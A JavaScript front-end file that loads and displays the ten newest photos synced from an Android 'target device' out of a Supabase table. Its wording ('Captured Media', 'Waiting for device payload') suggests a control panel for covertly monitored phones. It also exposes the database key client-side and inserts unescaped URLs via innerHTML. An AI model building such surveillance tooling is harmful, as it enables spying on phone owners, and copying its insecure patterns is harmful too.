document.addEventListener('DOMContentLoaded', async () => {
    const container = document.getElementById('gallery-container');
    const deviceId = localStorage.getItem('active_device_id');

    if (!deviceId) {
        container.innerHTML = '<p style="color: #d32f2f;">Critical Error: Target Device ID missing. Please select a device from the dashboard.</p>';
        return;
    }

    try {
        // 1. Get Security Config
        const configRes = await fetch('/api/config');
        const config = await configRes.json();
        
        // 2. Fetch LIVE DATA (Strict Limit: 10, Order: Newest First)
        // Assume 'device_photos' is the table where Android pushes the metadata & URL
        const queryUrl = `${config.supabase_url}/rest/v1/device_photos?device_id=eq.${deviceId}&order=created_at.desc&limit=10`;
        
        const photoRes = await fetch(queryUrl, {
            headers: {
                'apikey': config.supabase_key,
                'Authorization': `Bearer ${config.supabase_key}`
            }
        });

        const data = await photoRes.json();

        if (!data || data.length === 0) {
            container.innerHTML = '<div class="empty-state">No photos captured or synced yet.<br><small>Waiting for device payload...</small></div>';
            return;
        }

        // 3. Render the Grid
        container.innerHTML = '<div class="gallery-grid" id="grid"></div>';
        const grid = document.getElementById('grid');

        data.forEach(photo => {
            const card = document.createElement('div');
            card.className = 'photo-card';
            
            // Convert timestamp to readable format
            const dateObj = new Date(photo.created_at);
            const formattedDate = dateObj.toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });

            card.innerHTML = `
                <a href="${photo.file_url}" target="_blank">
                    <img src="${photo.file_url}" alt="Captured Media" class="photo-img" onerror="this.src='https://via.placeholder.com/250x250?text=Image+Not+Found'">
                </a>
                <div class="photo-meta">
                    <span class="photo-date">Captured: ${formattedDate}</span>
                </div>
            `;
            grid.appendChild(card);
        });

    } catch (error) {
        console.error("Gallery Sync Failure:", error);
        container.innerHTML = '<p style="color: #d32f2f;">Database connection failed. Check network logs.</p>';
    }
});
